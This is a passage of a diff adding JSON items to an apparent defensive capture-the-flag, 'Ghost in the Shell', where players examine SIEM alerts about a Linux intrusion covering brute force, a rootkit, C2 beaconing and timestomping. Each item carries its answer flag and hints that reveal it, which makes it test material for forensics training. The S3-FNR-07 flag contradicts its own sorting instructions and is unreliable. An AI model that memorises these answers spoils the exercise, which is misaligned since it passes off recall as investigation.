+          "content": "All four critical files were modified: /etc/passwd (added user), /etc/shadow (password hash), /etc/sudoers (privilege escalation), and /etc/ssh/sshd_config (SSH backdoor). The count is 4.",
+          "cost": 75
+        }
+      ]
+    },
+    {
+      "id": "S3-ALP-07",
+      "name": "[Alpha] C2 Beaconing Alert Count",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Alpha",
+      "description": "How many C2 beaconing alerts were generated on lnx-srv during the attack?\n\nCount the total number of alerts related to the C2 (Command and Control) beaconing activity, including DNS queries and periodic outbound connections to the C2 infrastructure.",
+      "value": 300,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "30",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "alpha",
+        "scenario3",
+        "c2",
+        "beaconing",
+        "alert-count"
+      ],
+      "hints": [
+        {
+          "content": "Look for alerts related to C2 communication on lnx-srv. These include DNS queries to the C2 domain, periodic outbound connections, and any custom correlation rules for beaconing detection.",
+          "cost": 75
+        },
+        {
+          "content": "Filter for alerts containing the C2 domain (update.systemnodes.net) or connections to the C2 IP on port 8443. Count all matching alerts during the attack timeframe.",
+          "cost": 75
+        },
+        {
+          "content": "The total C2 beaconing alert count is 30. This includes DNS resolution events and periodic connection alerts that indicate the beacon interval.",
+          "cost": 75
+        }
+      ]
+    },
+    {
+      "id": "S3-ALP-08",
+      "name": "[Alpha] Timestomping MITRE Technique",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Alpha",
+      "description": "What is the MITRE ATT&CK technique ID for the timestomping activity detected on lnx-srv?\n\nIdentify the specific MITRE ATT&CK sub-technique ID associated with the modification of file timestamps (mtime/atime) as an anti-forensic technique.",
+      "value": 300,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "T1070.006",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "alpha",
+        "scenario3",
+        "mitre",
+        "timestomping",
+        "anti-forensics"
+      ],
+      "hints": [
+        {
+          "content": "Timestomping is a sub-technique under MITRE ATT&CK's Indicator Removal (T1070). Look at the rule.mitre.id field in the FIM alerts that detected timestamp manipulation on lnx-srv.",
+          "cost": 75
+        },
+        {
+          "content": "The parent technique is T1070 (Indicator Removal). Timestomping has its own sub-technique number. Check the MITRE ATT&CK framework for the specific sub-technique under T1070.",
+          "cost": 75
+        },
+        {
+          "content": "The MITRE ATT&CK sub-technique for timestomping is T1070.006 (Indicator Removal: Timestomp). This covers modification of file timestamps to evade forensic analysis.",
+          "cost": 75
+        }
+      ]
+    },
+    {
+      "id": "S3-ALP-09",
+      "name": "[Alpha] Rootkit Auditd Executable Path",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Alpha",
+      "description": "What is the full executable path captured by auditd for the command used to load the rootkit kernel module on lnx-srv?\n\nExamine the auditd EXECVE events associated with kernel module loading to identify the exact binary path used by the attacker.",
+      "value": 300,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "/sbin/insmod",
+          "case_sensitive": true
+        }
+      ],
+      "tags": [
+        "alpha",
+        "scenario3",
+        "auditd",
+        "rootkit",
+        "executable-path"
+      ],
+      "hints": [
+        {
+          "content": "The attacker used a standard Linux utility to load the kernel module. Look at auditd EXECVE events where the syscall is related to module loading. The data.audit.exe field contains the full binary path.",
+          "cost": 75
+        },
+        {
+          "content": "Linux provides two main commands for loading kernel modules: insmod (direct load) and modprobe (with dependency resolution). The attacker used the more direct method. Check /sbin/ for the binary path.",
+          "cost": 75
+        },
+        {
+          "content": "The executable path is /sbin/insmod — the insmod utility is used to insert a kernel module directly without dependency resolution. It's located in /sbin/ on most Linux distributions.",
+          "cost": 75
+        }
+      ]
+    },
+    {
+      "id": "S3-FNR-01",
+      "name": "[Fenrir] Log Tampering and Timestomping",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Fenrir",
+      "description": "The attacker attempted to tamper with logs using timestomping on lnx-srv. Which log file was modified, and what is the time discrepancy (in seconds) between the mtime and ctime of the tampered file?\n\nProvide the answer in format: /path/to/logfile:seconds\n\nAnalyze FIM alerts and file metadata to detect the timestamp manipulation attempt.",
+      "value": 500,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "/var/log/auth.log:7200",
+          "case_sensitive": true
+        }
+      ],
+      "tags": [
+        "fenrir",
+        "scenario3",
+        "log-tampering",
+        "timestomping",
+        "anti-forensics"
+      ],
+      "hints": [
+        {
+          "content": "The attacker used the 'touch' command to change the modification time (mtime) of a critical log file to hide their activity. However, the ctime (inode change time) cannot be modified by normal users, creating a detectable discrepancy.",
+          "cost": 100
+        },
+        {
+          "content": "Look for FIM (syscheck) alerts on /var/log/ files where the mtime was changed. Wazuh's syscheck reports both old and new timestamps. The target was the primary authentication log file on Ubuntu.",
+          "cost": 100
+        },
+        {
+          "content": "The tampered file is /var/log/auth.log. The attacker set the mtime back by 2 hours (7200 seconds) to make it look like the file was last modified before the attack started, but the ctime remained current.",
+          "cost": 100
+        }
+      ]
+    },
+    {
+      "id": "S3-FNR-02",
+      "name": "[Fenrir] Complete IOC Chain",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Fenrir",
+      "description": "Reconstruct the complete IOC (Indicators of Compromise) chain for the Ghost in the Shell incident. Provide the attacker's source IP, the C2 server IP, the C2 domain, and the cryptominer pool domain.\n\nFormat: attacker_ip|c2_ip|c2_domain|pool_domain",
+      "value": 500,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "203.0.113.42|203.0.113.100|update.systemnodes.net|stratum.cryptopool.xyz",
+          "case_sensitive": true
+        }
+      ],
+      "tags": [
+        "fenrir",
+        "scenario3",
+        "ioc",
+        "threat-intel",
+        "full-investigation"
+      ],
+      "hints": [
+        {
+          "content": "You need four IOCs: (1) The SSH brute force source IP, (2) The IP where the toolkit was downloaded from, (3) The domain the C2 beacon resolves to, (4) The mining pool domain the cryptominer connects to.",
+          "cost": 100
+        },
+        {
+          "content": "The SSH attacker IP is in the 203.0.113.0/24 range. The C2 server uses a different IP in the same range. Look for DNS query alerts to find the C2 domain and mining pool domain. The C2 domain mimics a system update service.",
+          "cost": 100
+        },
+        {
+          "content": "Attacker IP: 203.0.113.42 (SSH brute force). C2/toolkit server IP: 203.0.113.100. C2 domain: update.systemnodes.net (resolved via DNS queries). Mining pool: stratum.cryptopool.xyz (found in cryptominer config or DNS queries).",
+          "cost": 100
+        }
+      ]
+    },
+    {
+      "id": "S3-FNR-03",
+      "name": "[Fenrir] Brute Force Duration",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Fenrir",
+      "description": "How many minutes did the SSH brute force attack last from the first failed login attempt to the successful authentication?\n\nCalculate the time difference between the first SSH failure alert and the first successful login alert from the attacker's IP on lnx-srv. Provide the answer in whole minutes.",
+      "value": 500,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "204",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "fenrir",
+        "scenario3",
+        "brute-force",
+        "duration",
+        "timeline"
+      ],
+      "hints": [
+        {
+          "content": "You need two timestamps: the first SSH failure from the attacker's IP (start of brute force) and the first successful login from the same IP. Calculate the difference in minutes.",
+          "cost": 100
+        },
+        {
+          "content": "The brute force started at 02:00:00 UTC and the successful login was at 05:23:41 UTC on March 3rd. Calculate the difference in minutes, rounding to whole minutes if needed.",
+          "cost": 100
+        },
+        {
+          "content": "From 02:00:00 to 05:23:41 is 3 hours, 23 minutes, and 41 seconds. Rounding to the nearest whole minute: 204 minutes (3*60 + 23 + round(41/60)).",
+          "cost": 100
+        }
+      ]
+    },
+    {
+      "id": "S3-FNR-04",
+      "name": "[Fenrir] Rootkit Auditd Syscall",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Fenrir",
+      "description": "What specific Linux syscall was captured by auditd when the rootkit kernel module was loaded on lnx-srv?\n\nIdentify the exact syscall name from the auditd event that corresponds to the kernel module insertion operation.",
+      "value": 500,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "init_module",
+          "case_sensitive": true
+        }
+      ],
+      "tags": [
+        "fenrir",
+        "scenario3",
+        "rootkit",
+        "auditd",
+        "syscall"
+      ],
+      "hints": [
+        {
+          "content": "Linux has specific syscalls for loading kernel modules. Look at the data.audit.syscall field in the auditd alert associated with the rootkit module loading event on lnx-srv.",
+          "cost": 100
+        },
+        {
+          "content": "The two main syscalls for loading kernel modules are init_module and finit_module. The attacker used insmod, which invokes one of these syscalls. Check which one appears in the auditd log.",
+          "cost": 100
+        },
+        {
+          "content": "The syscall is init_module. When insmod loads a kernel module, it reads the .ko file and calls the init_module syscall to insert it into the running kernel.",
+          "cost": 100
+        }
+      ]
+    },
+    {
+      "id": "S3-FNR-05",
+      "name": "[Fenrir] Distinct Brute Force Usernames",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Fenrir",
+      "description": "How many distinct (unique) usernames did the attacker attempt during the SSH brute force attack on lnx-srv?\n\nCount the number of unique values in the target username field across all SSH failure alerts from the attacker's IP.",
+      "value": 500,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "20",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "fenrir",
+        "scenario3",
+        "brute-force",
+        "usernames",
+        "enumeration"
+      ],
+      "hints": [
+        {
+          "content": "Filter for SSH failure alerts (rule.id 5710 or 5716) from the attacker's IP on lnx-srv. Then create a terms aggregation on the data.dstuser field to count the distinct usernames attempted.",
+          "cost": 100
+        },
+        {
+          "content": "The attacker used a wordlist of common usernames including service accounts (deploy, admin, root, etc.) and generic names. Use a cardinality aggregation on the username field to get the unique count.",
+          "cost": 100
+        },
+        {
+          "content": "The attacker tried exactly 20 distinct usernames during the brute force attack. This is a typical small-to-medium wordlist targeting common Linux accounts and service accounts.",
+          "cost": 100
+        }
+      ]
+    },
+    {
+      "id": "S3-FNR-06",
+      "name": "[Fenrir] Anti-Forensics MITRE Chain",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Fenrir",
+      "description": "What are the MITRE ATT&CK technique IDs for the complete anti-forensics chain used by the attacker on lnx-srv? Include both the history clearing and the timestomping techniques.\n\nProvide the answer as pipe-separated MITRE IDs in order of execution.",
+      "value": 500,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "T1070.003|T1070.006",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "fenrir",
+        "scenario3",
+        "mitre",
+        "anti-forensics",
+        "kill-chain"
+      ],
+      "hints": [
+        {
+          "content": "The attacker performed two anti-forensics actions: clearing bash history and timestomping log files. Each maps to a specific MITRE ATT&CK sub-technique under T1070 (Indicator Removal).",
+          "cost": 100
+        },
+        {
+          "content": "T1070 has multiple sub-techniques. History clearing falls under one sub-technique, and file timestamp modification (timestomping) under another. Look at the T1070 sub-technique list in MITRE ATT&CK.",
+          "cost": 100
+        },
+        {
+          "content": "The chain is T1070.003 (Clear Command History) followed by T1070.006 (Timestomp). History clearing happened first, then the attacker modified log file timestamps to cover their tracks.",
+          "cost": 100
+        }
+      ]
+    },
+    {
+      "id": "S3-FNR-07",
+      "name": "[Fenrir] Full Network IOC Extraction",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Fenrir",
+      "description": "Extract ALL network-based Indicators of Compromise (IOCs) from the Ghost in the Shell incident. Include every unique external IP address and every external domain observed in the attack chain.\n\nProvide the answer as pipe-separated values: all IPs first (sorted ascending), then all domains (sorted alphabetically).",
+      "value": 500,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "203.0.113.42|203.0.113.100|93.184.216.34|update.systemnodes.net|stratum.cryptopool.xyz",
+          "case_sensitive": true
+        }
+      ],
+      "tags": [
+        "fenrir",
+        "scenario3",
+        "ioc",
+        "network",
+        "complete-extraction"
+      ],
+      "hints": [
+        {
+          "content": "You need to find every external IP and domain involved in the attack. Review all alert types: SSH failures (attacker IP), wget downloads (staging IP), DNS queries (C2 and mining domains), and any other outbound connections (additional IPs).",
+          "cost": 100
+        },
+        {
+          "content": "There are three unique external IPs and two domains. The IPs include the SSH attacker, the toolkit staging server, and one additional IP seen in outbound connections. The domains are the C2 beacon domain and the mining pool domain.",
+          "cost": 100
+        },
+        {
+          "content": "The five IOCs are: 203.0.113.42 (attacker), 203.0.113.100 (staging/C2 server), 93.184.216.34 (additional C2 endpoint), update.systemnodes.net (C2 domain), and stratum.cryptopool.xyz (mining pool).",
+          "cost": 100
+        }
+      ]
+    }
+  ]
+}
